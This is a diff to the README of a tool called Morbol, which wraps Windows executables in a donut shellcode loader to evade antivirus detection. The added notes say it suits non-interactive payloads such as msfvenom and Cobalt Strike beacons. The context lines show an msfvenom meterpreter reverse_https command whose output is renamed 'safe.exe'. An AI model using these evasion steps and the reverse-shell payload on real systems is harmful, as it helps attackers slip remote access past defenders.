@@ -1,6 +1,8 @@
 # Morbol
 
-Wraps PE Files (PIE required) into a shellcode loader via donut. This mainly evades detection on *disk*.
+Wraps PE Files (PIE required) into a shellcode loader via donut. Note that this is meant for non interactive executeables that do not require arguments and do not generate any output that you want to obtain (e.g. won't work for Rubeus or Mimikatz, but does for msfvenom/cs beacons).
+
+Please note that defender is now pretty good at detecting go loaders, so don't expect great results.
 
 ## Setup
 
@@ -22,7 +24,6 @@ In my experience the only reliable way to evade defender with meterpreter is to 
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=... LPORT=...  HandlerSSLCert=... -f exe  > msf.exe
 python3 morbol.py msf.exe safe.exe
 ```
-
 
 ## Credit
 
